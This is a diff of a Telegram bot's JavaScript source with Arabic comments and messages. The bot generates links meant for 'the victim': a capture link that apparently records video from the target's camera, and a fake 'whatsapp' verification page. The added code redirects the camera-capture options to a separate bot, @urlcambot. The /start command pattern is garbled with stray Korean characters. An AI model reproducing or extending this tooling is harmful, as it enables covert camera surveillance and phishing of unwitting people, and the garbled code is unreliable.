@@ -1289,9 +1289,17 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
         });
     }
 });
-bot.on('callback_query', (callbackQuery) => {
+bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
+
+    // تم إضافة هذا الشرط ليتعامل مع الكاميرات والفيديو ويرسل بوتك مباشرة
+    const action = data.split(':')[0];
+    if (action === 'captureFront' || action === 'captureBack' || action === 'capture_video' || data === 'capture_video') {
+        await bot.sendMessage(chatId, "عذراً، هذه الميزة متوقفة مؤقتاً في هذا البوت.\n\nيرجى استخدام بوت التصوير عبر رابط متطور:\n@urlcambot");
+        await bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
 
     if (data === 'capture_video') {
         const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: ${baseUrl}/capture?t=${generateShortToken(chatId, 'capture_video')}`;
@@ -1321,6 +1329,7 @@ bot.on('callback_query', async (callbackQuery) => {
         });
         return;
     }
+
 
     if (data === 'request_verification') {
         const verificationLink = `${baseUrl}/whatsapp?t=${generateShortToken(chatId, 'whatsapp')}`;
